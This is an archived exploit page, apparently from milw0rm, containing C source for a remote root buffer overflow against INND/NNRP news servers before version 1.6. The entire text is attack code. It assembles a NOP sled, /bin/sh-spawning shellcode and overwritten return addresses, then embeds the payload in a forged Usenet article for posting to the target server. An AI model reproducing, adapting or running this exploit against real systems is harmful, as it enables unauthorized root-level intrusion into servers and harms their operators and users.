<html><head><title>INND/NNRP < 1.6.X Remote Root Overflow Exploit</title></head><pre>/*
 *  INND/NNRP remote root overflow
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define DEFAULT_OFFSET	792
#define BUFFER_SIZE	796
#define ADDRS		80
#define RET			0xefbf95e4
#define NOP			&quot;\x08\x21\x02\x80&quot;

int main(argc, argv)
int argc;
char **argv;
{
  char *buff = NULL, *ptr = NULL;
  u_long *addr_ptr = NULL;
  int ofs = DEFAULT_OFFSET;
  int noplen;
  int i, j;
  u_char execshell[] = 
    &quot;\x34\x16\x05\x06\x96\xd6\x05\x34\x20\x20\x08\x01&quot;
    &quot;\xe4\x20\xe0\x08\x0b\x5a\x02\x9a\xe8\x3f\x1f\xfd&quot;
    &quot;\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02&quot;
    &quot;\x60\x40\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99&quot;
    &quot;\x0b\x18\x02\x98\x34\x16\x04\xbe\x20\x20\x08\x01&quot;
    &quot;\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe&quot;
    &quot;/bin/sh&quot;;
  
  if(argc &gt; 1)
    ofs = atoi(argv[1]);

  if(!(buff = malloc(4096)))
  {
    (void)fprintf(stderr, &quot;can't allocate memory\n&quot;);
    exit(1);
  }

  ptr = buff;
  noplen = BUFFER_SIZE - strlen(execshell) - ADDRS;

  for(i = 0; i &lt; noplen / 4; i++)
  {
    for(j = 0; j &lt; 4; j++)
      *ptr++ = NOP[j];
  }

  *ptr += noplen;

  for(i = 0; i &lt; strlen(execshell); i++)
    *ptr++ = execshell[i];

  addr_ptr = (unsigned long *)ptr;

  for(i = 0; i &lt; ADDRS / 4; i++)
    *addr_ptr++ = (RET - ofs);

  ptr = (char *)addr_ptr;
  *ptr = '\0';

  (void)fprintf(stderr, &quot;shellcode len: %d, RET: %x\n&quot;, strlen(buff), RET-ofs);

  printf(
    &quot;Path: babcia!padlina\n&quot;
    &quot;From: babunia @%s\n&quot;
    &quot;Newsgroups: pl.test\n&quot;
    &quot;Subject: test\n&quot;
    &quot;Message-ID: &lt;830201540.9220@padlina.z-miesne.krakow.pl&gt;\n&quot;
    &quot;Date: 26 Aug 1999 10:36:54 +0200\n&quot;
    &quot;Lines: 1\n&quot;
    &quot;\n&quot;
    &quot;west. test it.\n&quot;
    &quot;.\n&quot;, buff);
}


// milw0rm.com [2000-11-30]</pre></html>